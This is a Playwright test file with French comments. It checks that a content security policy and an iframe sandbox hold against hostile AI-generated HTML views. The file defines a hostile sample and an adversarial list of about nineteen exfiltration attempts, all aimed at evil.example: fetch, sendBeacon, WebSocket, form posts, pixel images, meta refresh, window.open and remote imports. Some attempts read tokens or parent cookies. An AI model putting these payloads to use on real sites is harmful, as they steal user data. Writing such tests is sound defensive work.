import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { expect, test } from '@playwright/test';

import { BIBLIOTHEQUES_ADMISES, avecPolitiqueDeContenu } from '../src/app/core/assistant/vues-libres';

/**
 * KAN-95 : preuve dans un vrai navigateur que la politique de contenu des vues libres tient. Le « code généré » ci-dessous
 * est hostile : il tente de sortir des données, de charger un script ou une image externe, de soumettre un formulaire et
 * de lire l'application. Il tourne dans une iframe `sandbox="allow-scripts"` (comme le moteur de CopilotKit) dont le
 * document porte la politique posée par `avecPolitiqueDeContenu`.
 */
const CODE_HOSTILE = `<html><head></head><body>
<form id="f" action="https://evil.example/collecte" method="post"><input name="d" value="salaires"><button id="b">ok</button></form>
<img src="https://evil.example/pixel.png?d=salaires">
<script>
  const rapport = { violations: [], inline: true };
  document.addEventListener('securitypolicyviolation', (e) => rapport.violations.push(e.violatedDirective.split(' ')[0]));
  (async () => {
    try { await fetch('https://evil.example/collecte', { method: 'POST', body: 'salaires' }); rapport.fetch = 'passe'; } catch { rapport.fetch = 'bloque'; }
    try { rapport.stockage = typeof localStorage.getItem('jeton'); } catch { rapport.stockage = 'interdit'; }
    try { rapport.parent = typeof parent.document.cookie; } catch { rapport.parent = 'interdit'; }
    const script = document.createElement('script');
    script.src = 'https://evil.example/x.js';
    document.head.appendChild(script);
    const admise = document.createElement('script');
    admise.src = '${BIBLIOTHEQUES_ADMISES[0]}';
    document.head.appendChild(admise);
    document.getElementById('f').requestSubmit();
    await new Promise((r) => setTimeout(r, 800));
    parent.postMessage({ rapport }, '*');
  })();
</script></body></html>`;

// La politique du document hôte posée par nginx (`frame-src`), lue dans la configuration réelle pour que le test suive le serveur.
const POLITIQUE_HOTE = /add_header Content-Security-Policy "([^"]+)" always;/.exec(readFileSync(join(__dirname, '..', 'nginx.conf'), 'utf-8'))?.[1] ?? '';

test.describe('Vues libres : politique de contenu (KAN-95)', () => {
  test('nginx pose la politique qui ferme la navigation des cadres', () => {
    expect(POLITIQUE_HOTE).toContain("frame-src 'self'");
  });

  test('le code généré ne sort aucune donnée et ne lit pas l\'application', async ({ page }) => {
    await page.goto('about:blank');
    const rapport = await page.evaluate(
      ([srcdoc]) =>
        new Promise<{ violations: string[]; inline: boolean; fetch: string; stockage: string; parent: string }>((resolve) => {
          window.addEventListener('message', (m) => resolve((m.data as { rapport: never }).rapport));
          const iframe = document.createElement('iframe');
          iframe.setAttribute('sandbox', 'allow-scripts');
          iframe.srcdoc = srcdoc;
          document.body.appendChild(iframe);
        }),
      [avecPolitiqueDeContenu(CODE_HOSTILE)]
    );

    expect(rapport.inline).toBe(true); // le script en ligne du moteur s'exécute
    expect(rapport.fetch).toBe('bloque');
    expect(rapport.stockage).toBe('interdit');
    expect(rapport.parent).toBe('interdit');
    expect(rapport.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src', 'script-src-elem']));
    // Le formulaire est déjà fermé par l'iframe elle-même (pas de `allow-forms`) ; `form-action 'none'` double ce verrou.
    // La bibliothèque admise n'a produit aucune violation : seules les deux adresses exactes passent.
    expect(rapport.violations.filter((v) => v === 'script-src-elem')).toHaveLength(1);
  });

  // KAN-284 : jeu adverse rejoué à chaque changement de modèle, de prompt ou de bibliothèque (la CI exécute ce fichier).
  // Chaque tentative doit échouer ; la liste ne fait que s'allonger.
  const TENTATIVES: Record<string, string> = {
    'balise de redirection': `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=https://evil.example/">'); return 'tente';`,
    'feuille de style externe': `const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://evil.example/x.css'; document.head.appendChild(l); return 'tente';`,
    '@import externe': `const s = document.createElement('style'); s.textContent = '@import url(https://evil.example/x.css);'; document.head.appendChild(s); return 'tente';`,
    'cadre imbriqué': `const f = document.createElement('iframe'); f.src = 'https://evil.example/'; document.body.appendChild(f); return 'tente';`,
    'objet embarqué': `const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; document.body.appendChild(o); return 'tente';`,
    'WebSocket': `try { new WebSocket('wss://evil.example/'); return 'tente'; } catch { return 'bloque'; }`,
    'EventSource': `try { const e = new EventSource('https://evil.example/'); e.onerror = () => {}; return 'tente'; } catch { return 'bloque'; }`,
    'balise de suivi (sendBeacon)': `try { navigator.sendBeacon('https://evil.example/', 'salaires'); return 'tente'; } catch { return 'bloque'; }`,
    'navigation du cadre (meta refresh avec données)': `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=https://evil.example/?d=salaires">'); return 'tente';`,
    'navigation du cadre (location avec données)': `location.href = 'https://evil.example/?d=salaires'; return 'tente';`,
    'ouverture de fenêtre': `const w = window.open('https://evil.example/?d=salaires'); return w ? 'passe' : 'bloque';`,
    'import dynamique externe': `try { await import('https://evil.example/x.js'); return 'passe'; } catch { return 'bloque'; }`,
    'eval': `try { return eval('1+1') === 2 ? 'passe' : 'bloque'; } catch { return 'bloque'; }`,
    'new Function': `try { return new Function('return 1')() === 1 ? 'passe' : 'bloque'; } catch { return 'bloque'; }`,
    'base de l’adresse': `const b = document.createElement('base'); b.href = 'https://evil.example/'; document.head.appendChild(b); return document.baseURI.startsWith('https://evil.example') ? 'passe' : 'bloque';`,
    'cookie de l’application': `try { return parent.document.cookie.length >= 0 ? 'passe' : 'bloque'; } catch { return 'bloque'; }`,
    'fenêtre racine': `try { return top.document.title.length >= 0 ? 'passe' : 'bloque'; } catch { return 'bloque'; }`,
    'IndexedDB': `try { await new Promise((ok, ko) => { const r = indexedDB.open('x'); r.onsuccess = ok; r.onerror = ko; }); return 'passe'; } catch { return 'bloque'; }`,
    'navigation de la fenêtre parente': `try { parent.location.href = 'https://evil.example/'; return 'passe'; } catch { return 'bloque'; }`
  };

  for (const [nom, code] of Object.entries(TENTATIVES)) {
    test(`jeu adverse : ${nom} échoue`, async ({ page }) => {
      const document_ = avecPolitiqueDeContenu(
        `<html><head></head><body><script>(async () => { let r; try { r = await (async () => { ${code} })(); } catch (e) { r = 'bloque'; } parent.postMessage({ r }, '*'); })();</script></body></html>`
      );
      await page.route('http://hote.test/', (route) =>
        route.fulfill({ status: 200, contentType: 'text/html', headers: { 'content-security-policy': POLITIQUE_HOTE }, body: '<html><body>hôte</body></html>' })
      );
      await page.goto('http://hote.test/');
      // L'oracle : tout ce qui arrive à ce point d'interception a franchi la politique de contenu (une requête qu'elle arrête
      // n'atteint jamais le réseau). La liste doit rester vide.
      const sorties: string[] = [];
      await page.route(/evil\.example/, (route) => {
        sorties.push(route.request().url());
        return route.fulfill({ status: 204 });
      });
      const resultat = await page.evaluate(
        ([srcdoc]) =>
          new Promise<string>((resolve) => {
            window.addEventListener('message', (m) => resolve((m.data as { r: string }).r));
            const iframe = document.createElement('iframe');
            iframe.setAttribute('sandbox', 'allow-scripts');
            iframe.srcdoc = srcdoc;
            document.body.appendChild(iframe);
          }),
        [document_]
      );
      await page.waitForTimeout(300);

      expect(resultat).not.toBe('passe');
      expect(sorties, 'aucune requête ne doit atteindre l’extérieur').toEqual([]);
    });
  }
});

